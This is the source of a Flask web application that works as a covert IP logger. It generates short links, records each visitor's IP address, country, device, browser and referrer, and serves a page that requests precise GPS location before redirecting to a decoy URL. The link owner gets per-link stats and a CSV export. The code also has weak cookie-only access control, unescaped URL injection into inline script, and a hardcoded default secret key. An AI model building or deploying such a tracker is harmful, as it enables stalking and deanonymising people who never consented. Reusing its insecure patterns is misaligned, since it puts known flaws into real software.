from flask import Flask, render_template, request, redirect, url_for, make_response, Response
import sqlite3
import uuid
from datetime import datetime
import csv
import io
from functools import wraps
import os
from itertools import cycle

app = Flask(__name__)
app.config['DATABASE'] = 'iplogger.db'
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev-secure-key-123')

FRUIT_NAMES = cycle(["🍉 Арбуз", "🍒 Вишня", "🍈 Дыня", "🍎 Яблоко", "🍐 Груша", "🍊 Апельсин"])

def require_cookie(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        link_id = kwargs.get('link_id')
        if request.cookies.get(f'access_{link_id}') != 'true':
            return redirect(url_for('index'))
        return f(*args, **kwargs)
    return decorated_function

def init_db():
    with sqlite3.connect(app.config['DATABASE']) as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS links 
                    (id TEXT PRIMARY KEY,
                     created_at DATETIME,
                     target_url TEXT)''')

        c.execute('''CREATE TABLE IF NOT EXISTS logs 
                    (id INTEGER PRIMARY KEY AUTOINCREMENT,
                     link_id TEXT NOT NULL,
                     user_identifier TEXT,
                     ip TEXT,
                     country TEXT,
                     platform TEXT,
                     browser TEXT,
                     referrer TEXT,
                     latitude REAL,
                     longitude REAL,
                     timestamp DATETIME)''')

        for column in [('user_identifier', 'TEXT'), ('latitude', 'REAL'), ('longitude', 'REAL')]:
            c.execute("PRAGMA table_info(logs)")
            columns = [col[1] for col in c.fetchall()]
            if column[0] not in columns:
                c.execute(f"ALTER TABLE logs ADD COLUMN {column[0]} {column[1]}")
        conn.commit()

init_db()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/create', methods=['POST'])
def create_link():
    link_id = str(uuid.uuid4())[:8]
    target_url = request.form.get('target_url', 'https://google.com').strip()
    if not target_url.startswith(('http://', 'https://')):
        target_url = f'http://{target_url}'

    with sqlite3.connect(app.config['DATABASE']) as conn:
        c = conn.cursor()
        c.execute("INSERT INTO links (id, created_at, target_url) VALUES (?, ?, ?)", 
                 (link_id, datetime.now(), target_url))
        conn.commit()

    resp = make_response(redirect(url_for('stats', link_id=link_id)))
    resp.set_cookie(f'access_{link_id}', 'true', max_age=60*60*24*365)
    return resp

@app.route('/<link_id>', methods=['GET', 'POST'])
def track(link_id):
    with sqlite3.connect(app.config['DATABASE']) as conn:
        c = conn.cursor()
        c.execute("SELECT target_url FROM links WHERE id = ?", (link_id,))
        target = c.fetchone()
    redirect_url = target[0] if target else 'https://google.com'

    if request.method == 'POST':
        try:
            data = request.get_json()
            lat = float(data['lat'])
            lon = float(data['lon'])
            log_id = int(data['log_id'])

            with sqlite3.connect(app.config['DATABASE']) as conn:
                c = conn.cursor()
                c.execute('UPDATE logs SET latitude=?, longitude=? WHERE id=?',
                         (lat, lon, log_id))
                conn.commit()
            return 'OK'
        except Exception as e:
            app.logger.error(f'Error: {str(e)}')
            return 'Bad Request', 400

    user_id = next(FRUIT_NAMES)
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '').lower()
    referrer = request.referrer
    timestamp = datetime.now()

    platform = 'Unknown'
    for keyword, name in [('windows', 'Windows'), ('linux', 'Linux'),
                         ('macintosh', 'MacOS'), ('iphone', 'iPhone'),
                         ('android', 'Android')]:
        if keyword in user_agent:
            platform = name
            break

    browser = 'Unknown'
    for keyword, name in [('yabrowser', 'Yandex'), ('opr', 'Opera'),
                         ('edg', 'Edge'), ('chrome', 'Chrome'),
                         ('firefox', 'Firefox'), ('safari', 'Safari')]:
        if keyword in user_agent:
            browser = name
            break

    country = 'Unknown'
    try:
        from ip2geotools.databases.noncommercial import DbIpCity
        res = DbIpCity.get(ip, api_key='free')
        country = res.country
    except: pass

    with sqlite3.connect(app.config['DATABASE']) as conn:
        c = conn.cursor()
        c.execute('''INSERT INTO logs 
                  (link_id, user_identifier, ip, country, platform, browser, referrer, timestamp)
                  VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                  (link_id, user_id, ip, country, platform, browser, referrer, timestamp))
        log_id = c.lastrowid
        conn.commit()

    return f'''
    <!DOCTYPE html>
    <html>
    <body>
    <script>
    navigator.geolocation.getCurrentPosition(
        position => {{
            fetch(window.location.href, {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    log_id: {log_id}
                }})
            }}).then(() => window.location = "{redirect_url}");
        }},
        error => window.location = "{redirect_url}",
        {{ enableHighAccuracy: true, timeout: 5000 }}
    );
    </script>
    </body>
    </html>
    '''

@app.route('/stats/<link_id>')
@require_cookie
def stats(link_id):
    with sqlite3.connect(app.config['DATABASE']) as conn:
        c = conn.cursor()
        c.execute('''SELECT * FROM logs 
                  WHERE link_id = ?
                  ORDER BY timestamp DESC
                  LIMIT 100''', (link_id,))
        logs = c.fetchall()

    return render_template('stats.html',
                         logs=logs,
                         link_id=link_id,
                         tracking_url=f"{request.host_url}{link_id}")

@app.route('/export/<link_id>/csv')
@require_cookie
def export_csv(link_id):
    with sqlite3.connect(app.config['DATABASE']) as conn:
        c = conn.cursor()
        c.execute('SELECT * FROM logs WHERE link_id = ?', (link_id,))
        data = c.fetchall()

    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(['ID','User ID','Link ID','IP','Country','Platform',
                   'Browser','Referrer','Latitude','Longitude','Timestamp'])
    for row in data:
        writer.writerow(row)

    return Response(output.getvalue(),
                  mimetype='text/csv',
                  headers={'Content-Disposition': f'attachment;filename={link_id}_logs.csv'})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
